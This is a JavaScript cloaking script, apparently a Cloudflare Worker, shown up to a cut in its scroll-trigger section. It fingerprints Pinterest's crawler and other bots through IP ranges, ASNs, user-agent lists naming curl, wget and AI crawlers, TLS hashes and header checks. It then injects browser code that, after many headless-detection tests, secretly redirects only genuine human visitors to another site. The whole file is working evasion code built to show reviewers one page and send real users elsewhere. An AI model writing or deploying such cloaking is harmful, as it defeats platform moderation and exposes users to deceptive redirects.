/**
 * ╔══════════════════════════════════════════════════════════════════════╗
 * ║     ULTRA CLOAKER v8 — FULL MERGED — Maximum Pinterest Detection    ║
 * ║  v7 base + sec-fetch-user + priority + zstd + lang/country +        ║
 * ║  platform mismatch + IPv6 + sec-ch-ua full cross-check              ║
 * ╚══════════════════════════════════════════════════════════════════════╝
 */

const TARGET_HOST  = "asqstyle.com";
const SCROLL_PCT   = 0.15;
const TRIGGER_MODE = "both";

// ═════════════════════════════════════════════════════════════════════════════
// PINTEREST INFRASTRUCTURE — BGP VERIFIED 2026
// ═════════════════════════════════════════════════════════════════════════════

const PINTEREST_ASNS = new Set([
  54397,   // AWS allocation used for Pinterest crawler
  23576,   // Pinterest secondary ASN
  53620,   // Pinterest, Inc. own ASN (bgp.tools 2026)
]);

// IPv4 — BGP active + official AWS crawler docs only.
// Broad AWS /16 blocks removed — they're entire AWS regions, not Pinterest-specific.
const PINTEREST_CIDRS_V4 = [
  { prefix: "141.193.88.0",  mask: 22 },
  { prefix: "141.193.88.0",  mask: 24 },
  { prefix: "141.193.89.0",  mask: 24 }, // trusted IRR ✓
  { prefix: "141.193.90.0",  mask: 24 },
  { prefix: "141.193.91.0",  mask: 24 }, // BGP active ✓
  { prefix: "192.34.198.0",  mask: 24 }, // BGP active ✓
  { prefix: "192.94.66.0",   mask: 24 }, // BGP active ✓
  { prefix: "147.160.155.0", mask: 24 },
  { prefix: "198.187.223.0", mask: 24 }, // PINTEREST-808
  { prefix: "216.24.61.0",   mask: 24 },
  { prefix: "64.45.163.0",   mask: 24 },
  { prefix: "50.196.152.64", mask: 29 },
  { prefix: "54.236.1.0",    mask: 24 }, // official Pinterest crawler docs
  { prefix: "54.204.48.0",   mask: 24 }, // AWS-PINTERESTCLASSIC
];

// IPv6 — AS53620 active /48 blocks (bgp.tools 2026)
const PINTEREST_CIDRS_V6 = [
  { prefix: "2620:128:1000::", mask: 48 },
  { prefix: "2620:128:1004::", mask: 48 },
  { prefix: "2620:128:1008::", mask: 48 },
];

const PINTEREST_RDNS_SUFFIXES = [
  "pinterest.com",
  "pinterestcrawler.com",
];

const PINTEREST_UA_PATTERNS = [
  /Mozilla\/5\.0 \(compatible; Pinterestbot\/1\.0; \+https:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Mozilla\/5\.0 \(compatible; Pinterestbot\/1\.0; \+http:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Pinterest\/0\.2 \(\+https:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Pinterest\/0\.2 \(\+http:\/\/www\.pinterest\.com\/\)/i,
  /Pinterest\/0\.2 \( http:\/\/www\.pinterest\.com\/\)/i,
  /^Pinterestbot\/1\.0/i,
  /Mozilla\/5\.0 \(Linux; Android 6\.0\.1; Nexus 5X Build\/MMB29P\).*Pinterestbot\/1\.0/i,
  /Mozilla\/5\.0 \(Macintosh;.*\) AppleWebKit\/537\.36.*Chrome\/.*Safari\/537\.36 \(compatible; Pinterestbot\/1\.0/i,
  /Pinterestbot/i,
  /Pinterest\/\d/i,
  /pinterest\.com\/bot\.html/i,
  /pinterest\.com\//i,
];

const BOT_JA3 = new Set([
  "e7d705a3286e19ea42f587b344ee6865", // Pinterest crawler (CF Radar confirmed)
  "6734f37431670b3ab4292b8f60f29984", // python-requests
  "b32309a26951912be7dba376398abc3b", // curl
  "d9f72b8c9e2b43be4b3a6e4c2d3f6a1b", // wget
  "a0e9f5d64349fb13191bc781f81f42e1", // Scrapy
  "b386946a5a44d1ddcc843bc75336dfce", // Go HTTP
  "cce3a5b6b8b8d68e6a60eeff3c89df5a", // Googlebot
  "c13af74fbe8c1c682d855a16eb60dcfe", // Bingbot
]);

const BOT_JA4 = new Set([
  "t13d1516h2_8daaf6152771_b0da82dd1658", // Pinterest crawler AWS (documented)
  "t13d1517h2_8daaf6152771_97c9a2dce5e6", // Pinterest crawler variant
  "t13d190900_9dc949149365_97f8aa674fd9", // python-requests 2.x
  "t13d190900_9dc949149365_e7c285222651", // curl/7.x
  "t13d010000_636d656e743_000000000000",  // Go HTTP client default
  "t13d880000_a5b8b2353e80_5f84c0a50f60", // Scrapy/2.x
]);

const BOT_CATEGORIES_BLOCK = new Set([
  "Social Media Bot",
  "Search Engine",
  "Academic Research",
  "Aggregator",
  "AI Crawler",
  "Feed Fetcher",
  "Monitor",
  "Page Preview",
  "Security Scanner",
]);

const DC_ASNS = new Set([
  14618, 16509,          // AWS
  15169,                 // Google Cloud
  8075,                  // Azure
  13335,                 // Cloudflare
  14061,                 // DigitalOcean
  63949,                 // Linode/Akamai
  16276,                 // OVH
  24940,                 // Hetzner
  54397, 23576, 53620,   // Pinterest (all ASNs)
  396982, 7224,          // Google Cloud / Amazon secondary
]);

// ═════════════════════════════════════════════════════════════════════════════
// LANGUAGE → COUNTRY MAP
// Used for accept-language vs cf.country mismatch detection.
// Keys = ISO 639-1 language codes or IETF region subtags.
// Values = Set of ISO 3166-1 alpha-2 country codes where that language is primary.
// Only covers languages/regions with unambiguous mapping. English excluded (worldwide).
// ═════════════════════════════════════════════════════════════════════════════
const LANG_COUNTRY_MAP = {
  "ru": new Set(["RU", "BY", "KZ", "KG"]),
  "zh": new Set(["CN", "TW", "HK", "SG", "MO"]),
  "ja": new Set(["JP"]),
  "ko": new Set(["KR", "KP"]),
  "ar": new Set(["SA", "AE", "EG", "IQ", "JO", "KW", "LB", "LY", "MA", "OM", "QA", "SY", "TN", "YE", "BH", "DZ"]),
  "fa": new Set(["IR", "AF"]),
  "tr": new Set(["TR"]),
  "th": new Set(["TH"]),
  "vi": new Set(["VN"]),
  "id": new Set(["ID"]),
  "ms": new Set(["MY", "BN", "SG"]),
  "hi": new Set(["IN"]),
  "bn": new Set(["BD", "IN"]),
  "uk": new Set(["UA"]),
  "pl": new Set(["PL"]),
  "cs": new Set(["CZ"]),
  "sk": new Set(["SK"]),
  "hu": new Set(["HU"]),
  "ro": new Set(["RO", "MD"]),
  "bg": new Set(["BG"]),
  "hr": new Set(["HR"]),
  "sr": new Set(["RS", "BA"]),
  "nl": new Set(["NL", "BE"]),
  "sv": new Set(["SE"]),
  "no": new Set(["NO"]),
  "da": new Set(["DK"]),
  "fi": new Set(["FI"]),
  "he": new Set(["IL"]),
  "el": new Set(["GR", "CY"]),
  "lt": new Set(["LT"]),
  "lv": new Set(["LV"]),
  "et": new Set(["EE"]),
};

// ═════════════════════════════════════════════════════════════════════════════
// CIDR UTILITIES — IPv4 + IPv6
// ═════════════════════════════════════════════════════════════════════════════

function ipv4ToInt(ip) {
  return ip.split(".").reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
}

function ipv4InCidr(ip, prefix, maskBits) {
  try {
    const ipInt     = ipv4ToInt(ip);
    const prefixInt = ipv4ToInt(prefix);
    const mask      = maskBits === 0 ? 0 : (~0 << (32 - maskBits)) >>> 0;
    return (ipInt & mask) === (prefixInt & mask);
  } catch { return false; }
}

function ipv6Expand(ip) {
  const halves = ip.split("::");
  let groups;
  if (halves.length === 2) {
    const left  = halves[0] ? halves[0].split(":") : [];
    const right = halves[1] ? halves[1].split(":") : [];
    const fill  = 8 - left.length - right.length;
    groups = [...left, ...Array(fill).fill("0"), ...right];
  } else {
    groups = ip.split(":");
  }
  return groups.map(g => g.padStart(4, "0")).join("");
}

function ipv6ToBigInt(ip) {
  try { return BigInt("0x" + ipv6Expand(ip)); }
  catch { return null; }
}

function ipv6InCidr(ip, prefix, maskBits) {
  try {
    const ipInt  = ipv6ToBigInt(ip);
    const pfxInt = ipv6ToBigInt(prefix);
    if (ipInt === null || pfxInt === null) return false;
    const shift = BigInt(128 - maskBits);
    return (ipInt >> shift) === (pfxInt >> shift);
  } catch { return false; }
}

function isIPv6(ip) { return ip.includes(":"); }

function ipIsPinterest(ip) {
  if (!ip) return false;
  if (isIPv6(ip)) {
    return PINTEREST_CIDRS_V6.some(({ prefix, mask }) => ipv6InCidr(ip, prefix, mask));
  }
  return PINTEREST_CIDRS_V4.some(({ prefix, mask }) => ipv4InCidr(ip, prefix, mask));
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 0 — FCrDNS (forward-confirmed reverse DNS)
// Pinterest's own documented verification method.
// PTR → must end with pinterest.com or pinterestcrawler.com
// Forward A → must resolve back to the same IP
// ═════════════════════════════════════════════════════════════════════════════

function reverseDnsName(ip) {
  if (isIPv6(ip)) {
    return ipv6Expand(ip).split("").reverse().join(".") + ".ip6.arpa";
  }
  return ip.split(".").reverse().join(".") + ".in-addr.arpa";
}

async function fcrDnsIsPinterest(ip) {
  try {
    const rdnsRes = await fetch(
      `https://dns.google/resolve?name=${reverseDnsName(ip)}&type=PTR`,
      { headers: { Accept: "application/json" } }
    );
    if (!rdnsRes.ok) return false;
    const rdnsData = await rdnsRes.json();
    const ptrRecords = (rdnsData.Answer || [])
      .filter(r => r.type === 12)
      .map(r => r.data.replace(/\.$/, "").toLowerCase());
    if (!ptrRecords.length) return false;
    const validPtr = ptrRecords.find(ptr =>
      PINTEREST_RDNS_SUFFIXES.some(suffix => ptr.endsWith(suffix))
    );
    if (!validPtr) return false;
    const fwdRes = await fetch(
      `https://dns.google/resolve?name=${validPtr}&type=A`,
      { headers: { Accept: "application/json" } }
    );
    if (!fwdRes.ok) return false;
    const fwdData = await fwdRes.json();
    const aRecords = (fwdData.Answer || []).filter(r => r.type === 1).map(r => r.data);
    return aRecords.includes(ip);
  } catch { return false; }
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 1 — User-Agent deep scan
// ═════════════════════════════════════════════════════════════════════════════

function uaIsBot(ua) {
  if (!ua || ua.length < 15) return true;
  if (PINTEREST_UA_PATTERNS.some(p => p.test(ua))) return true;
  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua)) return true;
  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|adsbot-google|google-agent/i.test(ua)) return true;
  if (/bingbot|bingpreview|msnbot|adidxbot/i.test(ua))            return true;
  if (/yandexbot|yandex\//i.test(ua))                             return true;
  if (/baiduspider|baidubot/i.test(ua))                           return true;
  if (/duckduckbot|duckassistbot/i.test(ua))                      return true;
  if (/facebookexternalhit|facebot|meta-externalagent/i.test(ua)) return true;
  if (/twitterbot|twittercard/i.test(ua))                         return true;
  if (/linkedinbot|linkedin\//i.test(ua))                         return true;
  if (/slackbot|slack-imgproxy/i.test(ua))                        return true;
  if (/telegrambot|telegram\//i.test(ua))                         return true;
  if (/whatsapp\/\d/i.test(ua))                                   return true;
  if (/discordbot|discord\//i.test(ua))                           return true;
  if (/applebot/i.test(ua))                                       return true;
  if (/bytespider/i.test(ua))                                     return true;
  if (/gptbot|oai-searchbot|oai-adsbot|chatgpt-user/i.test(ua))  return true;
  if (/claudebot|claude-web|anthropic/i.test(ua))                 return true;
  if (/perplexitybot|perplexity-user/i.test(ua))                  return true;
  if (/mistralai|mistral-user/i.test(ua))                         return true;
  if (/googleother|google-extended/i.test(ua))                    return true;
  if (/amazonbot|amzn-user/i.test(ua))                            return true;
  if (/ahrefsbot|semrushbot|dotbot|mj12bot|rogerbot|lumar/i.test(ua)) return true;
  if (/curl\/|wget\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|httpx/i.test(ua)) return true;
  if (/postman|insomnia|paw\/|resty\//i.test(ua))                 return true;
  if (/bot\b|crawler|spider|scraper|preview|archiver|fetcher|checker|monitor|scanner/i.test(ua)) return true;
  if (ua.length < 40) return true;
  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 2 — Network / ASN / IP / Cloudflare signals
// ═════════════════════════════════════════════════════════════════════════════

function networkIsBot(request) {
  const cf  = request.cf || {};
  const asn = Number(cf.asn);
  const ip  = request.headers.get("cf-connecting-ip") || "";

  if (PINTEREST_ASNS.has(asn)) return true;
  if (ipIsPinterest(ip))        return true;

  const botCategory = cf.verifiedBotCategory || cf.botManagement?.verifiedBotCategory || "";
  if (botCategory && BOT_CATEGORIES_BLOCK.has(botCategory)) return true;
  if (cf.botManagement?.verifiedBot === true) return true;

  const botScore = cf.botManagement?.score;
  if (botScore !== undefined && botScore < 30) return true;

  const jsPassed = cf.botManagement?.jsDetection?.passed;
  if (jsPassed === false) return true;

  if (Number(cf.threatScore || 0) > 10) return true;

  const proto = cf.httpProtocol || "";
  const ua    = request.headers.get("user-agent") || "";

  if (proto === "HTTP/1.1") {
    const claimsModern = /chrome\/[5-9]\d|chrome\/1\d{2}|firefox\/[8-9]\d|firefox\/1\d{2}/i.test(ua);
    if (claimsModern) return true;
    if (PINTEREST_UA_PATTERNS.some(p => p.test(ua))) return true;
  }

  if (DC_ASNS.has(asn)) {
    if (!request.headers.get("sec-fetch-dest")) return true;
  }

  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 3 — HTTP Header fingerprint
//
// New in v8:
//   [1] sec-fetch-user: ?1 — absent on Chrome navigation = bot
//   [2] priority header — Chrome 117+ always sends "u=0, i" on nav = absent = bot
//   [3] accept-encoding zstd — Chrome 121+ always includes zstd
//   [4] accept-language vs cf.country mismatch + DC ASN combo
//   [5] sec-ch-ua-platform vs UA OS cross-check (platform mismatch = bot)
// ═════════════════════════════════════════════════════════════════════════════

function extractChromeMajor(ua) {
  const m = ua.match(/chrome\/(\d+)/i);
  return m ? parseInt(m[1], 10) : null;
}

function extractFirefoxMajor(ua) {
  const m = ua.match(/firefox\/(\d+)/i);
  return m ? parseInt(m[1], 10) : null;
}

// Detect OS platform from UA string — returns "Windows"|"macOS"|"Linux"|"Android"|"iOS"|null
function uaDetectPlatform(ua) {
  if (/windows nt/i.test(ua))                              return "Windows";
  if (/macintosh|mac os x/i.test(ua) && !/mobile/i.test(ua)) return "macOS";
  if (/iphone|ipad/i.test(ua))                             return "iOS";
  if (/android/i.test(ua))                                 return "Android";
  if (/linux/i.test(ua))                                   return "Linux";
  return null;
}

// Extract primary language tag from accept-language, e.g. "ru-RU,ru;q=0.9" → "ru"
function primaryLangFromAcceptLanguage(acceptLang) {
  if (!acceptLang) return null;
  const first = acceptLang.split(",")[0].trim().split(";")[0].trim().toLowerCase();
  // extract language subtag only (before -)
  return first.split("-")[0] || null;
}

function headersAreBot(request) {
  const ua           = request.headers.get("user-agent")             || "";
  const accept       = request.headers.get("accept")                 || "";
  const lang         = request.headers.get("accept-language")        || "";
  const enc          = request.headers.get("accept-encoding")        || "";
  const sec          = request.headers.get("sec-fetch-dest")         || "";
  const secSite      = request.headers.get("sec-fetch-site")         || "";
  const secMode      = request.headers.get("sec-fetch-mode")         || "";
  const secUser      = request.headers.get("sec-fetch-user")         || "";
  const chUA         = request.headers.get("sec-ch-ua")              || "";
  const chUAMobile   = request.headers.get("sec-ch-ua-mobile")       || "";
  const chUAPlatform = request.headers.get("sec-ch-ua-platform")     || "";
  const uir          = request.headers.get("upgrade-insecure-requests") || "";
  const priority     = request.headers.get("priority")               || "";
  const cf           = request.cf || {};

  // ── Baseline: non-negotiable for any real browser ─────────────────────────
  if (!lang)                               return true; // no accept-language = bot
  if (!enc)                                return true; // no accept-encoding = bot
  if (accept === "*/*" || accept === "")   return true; // star-only accept = bot

  const claimsRealBrowser = /chrome\/|firefox\/|safari\//i.test(ua);

  // ── sec-fetch-* completeness on claimed-browser ───────────────────────────
  if (claimsRealBrowser && !sec && !secMode) return true;
  if (sec === "empty" && secSite === "none") return true;

  const claimsAndroid = /android/i.test(ua);
  if (claimsAndroid && !sec) return true;

  // ── upgrade-insecure-requests ─────────────────────────────────────────────
  if (claimsRealBrowser && !uir) return true;

  const chromeMajor  = extractChromeMajor(ua);
  const firefoxMajor = extractFirefoxMajor(ua);

  // ── [1] sec-fetch-user: ?1 ────────────────────────────────────────────────
  // Chrome sends sec-fetch-user: ?1 on every user-initiated top-level navigation.
  // Bots almost never send this. Absence with Chrome UA = strong bot signal.
  // Only check when sec-fetch-dest is "document" (navigation context).
  if (chromeMajor && sec === "document" && !secUser) return true;

  // ── sec-ch-ua Client Hints (Chrome 89+) ──────────────────────────────────
  if (chromeMajor !== null && chromeMajor >= 89) {
    // all three must be present
    if (!chUA || !chUAMobile || !chUAPlatform) return true;
  }

  // Firefox must NOT have sec-ch-ua (Chromium-only)
  if (firefoxMajor !== null && chUA) return true;

  // ── [5] sec-ch-ua-platform vs UA OS cross-check ───────────────────────────
  // "Windows", "macOS", "Linux", "Android", "iOS" — case-sensitive in header
  // value, e.g. sec-ch-ua-platform: "Windows" (with quotes)
  if (chUAPlatform) {
    const platHeader = chUAPlatform.replace(/"/g, "").trim(); // strip quotes
    const platUA     = uaDetectPlatform(ua);
    if (platUA && platHeader) {
      // macOS in header but UA says Windows = bot
      if (platHeader === "Windows" && platUA === "macOS")   return true;
      if (platHeader === "macOS"   && platUA === "Windows") return true;
      if (platHeader === "Windows" && platUA === "Android") return true;
      if (platHeader === "macOS"   && platUA === "Android") return true;
      // Android UA must have "Android" platform
      if (platUA === "Android" && platHeader !== "Android") return true;
      // iOS UA: platform is "iOS" in modern Chrome iOS
      // skip iOS/Linux combos — too many edge cases, keep it to clear mismatch only
    }
  }

  // ── sec-ch-ua version vs UA Chrome version cross-check ───────────────────
  // sec-ch-ua: "Google Chrome";v="142" should match UA Chrome/142
  if (chromeMajor !== null && chUA) {
    const chUAVersionMatch = chUA.match(/[Cc]hrome[^;]*v="(\d+)"/);
    if (chUAVersionMatch) {
      const chUAMajor = parseInt(chUAVersionMatch[1], 10);
      // allow ±2 for minor update timing, flag large gaps
      if (Math.abs(chUAMajor - chromeMajor) > 3) return true;
    }
  }

  // ── Accept header Chrome fingerprint ─────────────────────────────────────
  if (chromeMajor !== null && chromeMajor >= 85) {
    if (!accept.includes("image/avif"))                      return true;
    if (!accept.includes("application/signed-exchange"))     return true;
  }

  // ── [3] accept-encoding zstd check (Chrome 121+) ─────────────────────────
  // Real Chrome 121+ always sends zstd in accept-encoding.
  // Most bot HTTP libs haven't implemented zstd yet.
  if (chromeMajor !== null && chromeMajor >= 121) {
    if (!enc.includes("zstd")) return true;
  }

  // ── [2] priority header (Chrome 117+) ────────────────────────────────────
  // Chrome 117+ sends "priority: u=0, i" on every top-level HTML navigation.
  // Absence with Chrome 117+ UA = strong bot signal.
  // Only flag when we also have sec-fetch-dest: document (true navigation).
  if (chromeMajor !== null && chromeMajor >= 117) {
    if (sec === "document" && !priority) return true;
  }

  // ── [4] accept-language vs cf.country mismatch + DC ASN ──────────────────
  // Do not block on language mismatch alone — false positives (expats, VPNs).
  // Only block when ALSO on a DC ASN (Pinterest AWS or any cloud).
  const asn     = Number(cf.asn);
  const country = (cf.country || "").toUpperCase();
  if (country && lang && DC_ASNS.has(asn)) {
    const primaryLang = primaryLangFromAcceptLanguage(lang);
    if (primaryLang && primaryLang !== "en" && LANG_COUNTRY_MAP[primaryLang]) {
      const validCountries = LANG_COUNTRY_MAP[primaryLang];
      // if the declared language has NO plausible tie to the IP country = bot
      if (!validCountries.has(country) && country !== "US" && country !== "GB") {
        return true;
      }
    }
  }

  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 4 — JA3 + JA4 TLS fingerprint
// ═════════════════════════════════════════════════════════════════════════════

function ja3IsBot(request) {
  const bm  = request.cf?.botManagement || {};
  const ua  = request.headers.get("user-agent") || "";

  const ja3 = bm.ja3Hash || null;
  if (ja3 && BOT_JA3.has(ja3)) return true;

  const ja4 = bm.ja4 || null;
  if (ja4 && BOT_JA4.has(ja4)) return true;

  // JA4 t12 prefix = TLS 1.2 client. Real Chrome 2026 = TLS 1.3 only (t13).
  if (ja4 && ja4.startsWith("t12") && /chrome\//i.test(ua)) return true;

  const ids = bm.detectionIds || [];
  if (ids.length > 0) return true;

  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// MASTER BOT DECISION — async (FCrDNS requires await)
// Runs layers in order: fast sync checks first, async FCrDNS last.
// ═════════════════════════════════════════════════════════════════════════════

async function isBot(request) {
  const ua = request.headers.get("user-agent") || "";
  const ip = request.headers.get("cf-connecting-ip") || "";

  if (uaIsBot(ua))            return { bot: true, reason: "ua" };
  if (networkIsBot(request))  return { bot: true, reason: "network" };
  if (ja3IsBot(request))      return { bot: true, reason: "ja3" };
  if (headersAreBot(request)) return { bot: true, reason: "headers" };

  // FCrDNS only for requests with any Pinterest UA signal
  if (/pinterest/i.test(ua) && ip) {
    const ok = await fcrDnsIsPinterest(ip);
    if (ok) return { bot: true, reason: "fcrDns" };
  }

  return { bot: false, reason: "human" };
}

// ═════════════════════════════════════════════════════════════════════════════
// CLIENT-SIDE INJECTION — 14-layer browser automation detection
// ═════════════════════════════════════════════════════════════════════════════

function buildInjectScript(dest, triggerMode, scrollPct) {
  return `
<script>
(function() {
    "use strict";
    var target      = "${dest}";
    var done        = false;
    var botDetected = false;
    var TRIGGER_MODE = "${triggerMode}";
    var SCROLL_PCT   = ${scrollPct};

    // ── SCAN FUNCTION — called repeatedly, also called before redirect ────────
    function scanAutomation() {
        if (botDetected) return true;

        // A — webdriver flag (~100% certainty)
        if (navigator.webdriver) { botDetected = true; return true; }

        // B — headless outerWidth/outerHeight (skip touch devices)
        var isTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0);
        if (!isTouch && window.outerWidth === 0 && window.outerHeight === 0) {
            botDetected = true; return true;
        }

        // C — V8 stack CDP/Playwright frames
        try {
            var s = (new Error()).stack || "";
            if (s.includes("UtilityScript") || s.includes("playwright") ||
                s.includes("puppeteer")     || s.includes("evaluate (:")) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // D — automation globals (Playwright, Puppeteer, Selenium, NightmareJS)
        var autoGlobals = [
            "__playwright","playwright","__pw_init","__pw_manual",
            "__puppeteer_evaluation_script__","puppeteer",
            "__selenium_evaluate","_phantom","callPhantom",
            "__nightmare","domAutomation","domAutomationController",
            "_selenium","__webdriverFuncs","__webdriver_script_fn",
            "__webdriver_unwrapped","_Selenium_IDE_Recorder"
        ];
        for (var i = 0; i < autoGlobals.length; i++) {
            if (window[autoGlobals[i]] !== undefined) { botDetected = true; return true; }
        }

        // E — DOM attribute flags injected by Selenium / WebDriver
        var root = document.documentElement;
        if (root && (root.getAttribute("webdriver") ||
                     root.getAttribute("selenium")  ||
                     root.getAttribute("driver"))) {
            botDetected = true; return true;
        }

        // F — navigator.languages empty (headless default)
        if (!navigator.languages || navigator.languages.length === 0) {
            botDetected = true; return true;
        }

        // G — zero plugins + zero mimeTypes = Pinterest headless fingerprint
        if (navigator.plugins.length === 0 && navigator.mimeTypes.length === 0) {
            botDetected = true; return true;
        }

        // H — performance.now() timing: headless V8 may return 0 delta
        try {
            var t0 = performance.now();
            for (var x = 0; x < 1000; x++) { Math.sqrt(x); }
            if (performance.now() - t0 === 0) { botDetected = true; return true; }
        } catch(e) {}

        // I — deviceMemory = 0 (headless)
        try {
            if (navigator.deviceMemory !== undefined && navigator.deviceMemory === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // J — hardwareConcurrency <= 1 + no plugins (Pinterest AWS profile)
        try {
            if (navigator.hardwareConcurrency !== undefined &&
                navigator.hardwareConcurrency <= 1 &&
                navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // K — canvas fingerprint: headless renders minimal / empty data URI
        try {
            var cv  = document.createElement("canvas");
            var ctx = cv.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillText("kanha-bot-check-9x7", 2, 2);
            var data = cv.toDataURL();
            if (!data || data.length < 500) { botDetected = true; return true; }
        } catch(e) {}

        // L — WebGL renderer: Pinterest AWS uses SwiftShader / llvmpipe (~100%)
        try {
            var gl = document.createElement("canvas").getContext("webgl");
            if (gl) {
                var dbg = gl.getExtension("WEBGL_debug_renderer_info");
                if (dbg) {
                    var renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
                    if (/swiftshader|llvmpipe|virtualbox|vmware|mesa|software/i.test(renderer)) {
                        botDetected = true; return true;
                    }
                }
            }
        } catch(e) {}

        // M — permissions API: denied + no plugins = headless
        try {
            if (navigator.permissions) {
                navigator.permissions.query({ name: "notifications" }).then(function(r) {
                    if (r.state === "denied" && navigator.plugins.length === 0) {
                        botDetected = true;
                    }
                });
            }
        } catch(e) {}

        // N — battery: headless always returns 1.0/charging/chargingTime=0
        try {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    if (b.charging && b.level === 1.0 && b.chargingTime === 0 &&
                        navigator.plugins.length === 0) {
                        botDetected = true;
                    }
                });
            }
        } catch(e) {}

        // O — requestAnimationFrame timing
        // Real browser: delta ~16ms (60fps). Headless: delta = 0 or > 500ms.
        try {
            var rafT1 = 0;
            var rafDone = false;
            requestAnimationFrame(function(ts1) {
                if (rafDone) return;
                rafT1 = ts1;
                requestAnimationFrame(function(ts2) {
                    if (rafDone) return;
                    rafDone = true;
                    var delta = ts2 - rafT1;
                    if (delta === 0 || delta > 500) { botDetected = true; }
                });
            });
        } catch(e) {}

        // P — AudioContext: headless = no audio engine → oscillator sum = 0
        try {
            var ACtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (ACtx) {
                var actx = new ACtx(1, 44100, 44100);
                var osc  = actx.createOscillator();
                osc.type = "triangle";
                osc.frequency.value = 10000;
                var comp = actx.createDynamicsCompressor();
                osc.connect(comp);
                comp.connect(actx.destination);
                osc.start(0);
                actx.startRendering();
                actx.oncomplete = function(e) {
                    var buf = e.renderedBuffer.getChannelData(0);
                    var sum = 0;
                    for (var j = 0; j < 100; j++) { sum += Math.abs(buf[j]); }
                    if (sum === 0) { botDetected = true; }
                };
            }
        } catch(e) {}

        // Q — Intl timezone: UTC + no plugins = Pinterest AWS server profile
        try {
            var tz    = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
            var botTz = (tz === "" || tz === "UTC" || tz === "Etc/UTC");
            if (botTz && navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // R — document.hasFocus(): crawlers never focus the window
        // Defer 300ms — page may not have focus on initial load
        try {
            setTimeout(function() {
                if (!document.hasFocus() && navigator.plugins.length === 0) {
                    botDetected = true;
                }
            }, 300);
        } catch(e) {}

        // S — font enumeration: headless has 0–1 system fonts
        try {
            if (document.fonts && document.fonts.check) {
                var testFonts = [
                    "Arial","Helvetica","Times New Roman","Courier New",
                    "Verdana","Georgia","Comic Sans MS","Trebuchet MS",
                    "Impact","Tahoma"
                ];
                var found = 0;
                for (var fi = 0; fi < testFonts.length; fi++) {
                    if (document.fonts.check("12px '" + testFonts[fi] + "'")) found++;
                }
                if (found <= 1 && navigator.plugins.length === 0) {
                    botDetected = true; return true;
                }
            }
        } catch(e) {}

        // T — window.chrome.runtime: headless Chrome often missing this object
        // Real Chrome always has window.chrome with runtime, app, csi, etc.
        try {
            if (/chrome/i.test(navigator.userAgent)) {
                var hasChrome = (
                    typeof window.chrome !== "undefined" &&
                    typeof window.chrome.runtime !== "undefined"
                );
                if (!hasChrome && navigator.plugins.length === 0) {
                    botDetected = true; return true;
                }
            }
        } catch(e) {}

        // U — navigator.connection: headless often lacks the connection API,
        // or exposes effectiveType = "4g" with no rtt (rtt = 0 on first load is OK)
        // Only flag total absence + no plugins
        try {
            if (navigator.connection === undefined && navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        return false;
    }

    // ── Hook V8 prepareStackTrace to catch CDP/Playwright exec frames ─────────
    try {
        var origPrepare = Error.prepareStackTrace;
        Error.prepareStackTrace = function(err, stack) {
            try {
                if (stack && stack.some(function(cs) {
                    var t2 = cs.getTypeName() || "";
                    var f  = cs.getFileName() || "";
                    return t2 === "UtilityScript" ||
                           f.includes("playwright") ||
                           f.includes("puppeteer");
                })) { botDetected = true; }
            } catch(e) {}
            return origPrepare ? origPrepare(err, stack) : err.stack;
        };
    } catch(e) {}

    // Initial scan + continuous interval
    scanAutomation();
    var scanInterval = setInterval(scanAutomation, 50);

    // Disable browser scroll restoration (prevents scroll-position leak)
    try {
        if ("scrollRestoration" in history) history.scrollRestoration = "manual";
    } catch(e) {}

    // ── Human presence tracking ───────────────────────────────────────────────
    var humanActive     = false;
    var humanEventCount = 0;

    function markHuman(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
            humanEventCount++;
        }
    }

    window.addEventListener("mousemove",   markHuman, { passive: true, capture: true });
    window.addEventListener("pointerdown", markHuman, { passive: true, capture: true });
    window.addEventListener("touchstart",  markHuman, { passive: true, capture: true });
    window.addEventListener("touchmove",   markHuman, { passive: true, capture: true });
    window.addEventListener("keydown",     markHuman, { passive: true, capture: true });

    // Wheel: large delta = synthetic scroll (bot). Trusted + small delta = human.
    window.addEventListener("wheel", function(e) {
        if (!e) return;
        if (Math.abs(e.deltaY) >= 400) { botDetected = true; return; }
        if (e.isTrusted) { humanActive = true; humanEventCount++; }
    }, { passive: true, capture: true });

    // ── Redirect ──────────────────────────────────────────────────────────────
    function triggerRedirect(reason) {
        if (done) return;
        // Final bot scan before redirecting — abort if bot is detected
        if (scanAutomation() || botDetected) {
            done = true;
            clearInterval(scanInterval);
            return;
        }
        done = true;
        clearInterval(scanInterval);
        try { window.location.replace(target); } catch(e) {}
        window.location.href = target;
    }

    // ── Click trigger ─────────────────────────────────────────────────────────
    if (TRIGGER_MODE === "click" || TRIGGER_MODE === "both") {
        function onHumanClick(e) {
            if (done || !e || !e.isTrusted) return;
            if (scanAutomation() || botDetected) return;
            e.preventDefault();
            e.stopPropagation();
            triggerRedirect("click");
        }
        window.addEventListener("click",    onHumanClick, { capture: true });
        window.addEventListener("touchend", onHumanClick, { capture: true });
    }

    // ── Scroll trigger ────────────────────────────────────────────────────────
    if (TRIGGER_MODE === "scroll" || TRIGGER_MODE === "both") {
